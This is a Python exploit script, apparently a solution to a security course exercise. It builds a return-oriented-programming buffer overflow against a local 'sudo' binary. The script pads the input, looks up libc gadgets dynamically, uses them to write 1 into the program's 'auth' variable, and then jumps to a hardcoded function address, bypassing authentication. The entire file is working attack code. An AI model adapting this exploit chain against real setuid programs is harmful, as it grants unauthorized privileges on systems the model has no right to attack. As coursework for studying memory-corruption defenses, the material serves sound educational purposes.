import os, sys
import struct
import addresses
import assemble
from search import GadgetSearch


PATH_TO_SUDO = './sudo'
LIBC_DUMP_PATH = './libc.bin'
#080488C1

def get_arg():
    search = GadgetSearch(LIBC_DUMP_PATH)
    #checks for sequence of 00 in the address
    cond = lambda x: True if '00' not in [x[1][j:j+2] for j in range(0,len(x[1])-1,2)] else False

    # NOTES:
    # 1. Use `addresses.AUTH` to get the address of the `auth` variable.
    # 2. Don't write addresses of gadgets directly - use the search object to
    #    find the address of the gadget dynamically.
    msg = 'A'*66
    lst = []

 	#Put 1 to ebx
    lst = search.find_format("xor eax, eax",condition = cond)
    cmd =int(lst[1],16)
    msg+= struct.pack('<I',cmd)
    lst =search.find_format("inc eax",condition = cond)
    
    cmd =int(lst[1],16)
    msg+= struct.pack('<I',cmd)

    #put auth address to stack and pop it to edx
    lst = search.find_format("pop edx",condition = cond)
    cmd =int(lst[1],16)   
    msg+= struct.pack('<I',cmd)
    msg+= addresses.address_to_bytes(addresses.AUTH)

    #put 1 to auth
    lst = search.find_format("mov [edx], eax",condition = cond)
    cmd =int(lst[1],16) 
    msg+= struct.pack('<I',cmd)

    #add func address and return all msg
    return msg+'\xc6\x88\x04\x08'







def main(argv):
    os.execl(PATH_TO_SUDO, PATH_TO_SUDO, get_arg())


if __name__ == '__main__':
    main(sys.argv)
